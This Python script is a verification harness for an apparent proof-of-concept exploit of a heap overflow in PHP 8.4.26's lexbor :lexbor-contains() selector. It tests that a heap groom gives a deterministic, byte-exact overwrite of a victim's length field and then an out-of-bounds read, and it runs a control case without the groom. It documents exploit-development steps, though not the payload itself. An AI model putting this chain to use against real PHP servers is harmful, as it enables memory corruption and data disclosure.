#!/usr/bin/env python3
r"""Green harness for lexbor_write_what_where.py: the lexbor :lexbor-contains()
linear overflow upgraded to a controlled single-target overwrite on real ZendMM.

Asserts (stock php:8.4.26 CLI, real ZendMM -- NOT the ASan USE_ZEND_ALLOC=0 lab):
  (1) DETERMINISTIC + BYTE-EXACT: the filler-below groom lands a victim forward of
      the fresh mraw chunk and the overflow writes a chosen non-NUL qword exactly
      over the victim's len field (SMASHED_LEN == EXPECT across several values).
  (2) SURVIVAL: the process survives the linear clobber and returns to userland
      (SURVIVED=1 + POSTWORK runs).
  (3) OOB READ: the smashed len turns the victim into a forward OOB-read window.
  (4) CONTROL (negative): with no groom nothing live is forward -> no victim
      smashed (HIT=-1), isolating the groom as the enabling step.
Run (no compose lab; needs a stock php:8.4.26 CLI image with ext/dom -- the
lexbor_write_what_where.STOCK_IMAGE, built/run via docker by the PoC itself):
    python3 -I poc/primitives/write/verify_lexbor_write_what_where.py
"""
import os, sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import lexbor_write_what_where as W   # same-folder sibling PoC


def main():
    if not W._have_image(W.STOCK_IMAGE):
        print(f"[-] stock image {W.STOCK_IMAGE} missing; cannot verify on real ZendMM.")
        print("    (build a stock 8.4.26 CLI with ext/dom, or run the lexbor compose).")
        sys.exit(2)

    ok = True

    print("[*] (1) deterministic + byte-exact controlled overwrite (several values)")
    for fill in ("QRSTUVWX", "ABCDEFGH", "zzzz1111", "Mmmm7777"):
        rc, out = W._run_php("groom", fill)
        kv = W._parse(out)
        hit = int(kv.get("HIT", "-1"))
        exact = kv.get("EXACT") == "1"
        survived = kv.get("SURVIVED") == "1"
        print(f"    fill={fill}  hit=#{hit}  expect={kv.get('EXPECT')}  "
              f"smashed={kv.get('SMASHED_LEN')}  exact={exact}  survived={survived}")
        if not (hit >= 0 and exact and survived):
            print("      [-] expected a forward victim smashed byte-exact, surviving")
            ok = False

    print("\n[*] (2) survival of the intervening clobber (post-overflow work runs)")
    rc, out = W._run_php("groom", "QRSTUVWX")
    kv = W._parse(out)
    postwork = kv.get("POSTWORK")
    print(f"    SURVIVED={kv.get('SURVIVED')}  POSTWORK={postwork}")
    if not (kv.get("SURVIVED") == "1" and postwork and int(postwork) > 0):
        print("      [-] process did not survive the clobber"); ok = False

    print("\n[*] (3) forward OOB read via len-smash")
    rc, out = W._run_php("oob", "HHHHHHHG")
    kv = W._parse(out)
    print(f"    SMASHED_LEN={kv.get('SMASHED_LEN')}  OOB={kv.get('OOB')}  OOB_OK={kv.get('OOB_OK')}")
    if kv.get("OOB_OK") != "1":
        print("      [-] OOB read not observed"); ok = False

    print("\n[*] (4) control: no groom -> no victim smashed")
    rc, out = W._run_php("control")
    kv = W._parse(out)
    hit = int(kv.get("HIT", "-1"))
    print(f"    HIT={hit} (expected -1)  SURVIVED={kv.get('SURVIVED')}")
    if hit >= 0:
        print("      [-] a victim was smashed without the groom"); ok = False

    print()
    if ok:
        print("[+] PASS: controlled single-target overwrite is deterministic + byte-exact,")
        print("    survives the linear clobber, yields a forward OOB read, and vanishes")
        print("    without the groom. Full arbitrary-ADDRESS write stays gated two-stage")
        print("    (see poc/lexbor_write_what_where.py docstring).")
        sys.exit(0)
    print("[-] FAIL")
    sys.exit(1)


if __name__ == "__main__":
    main()
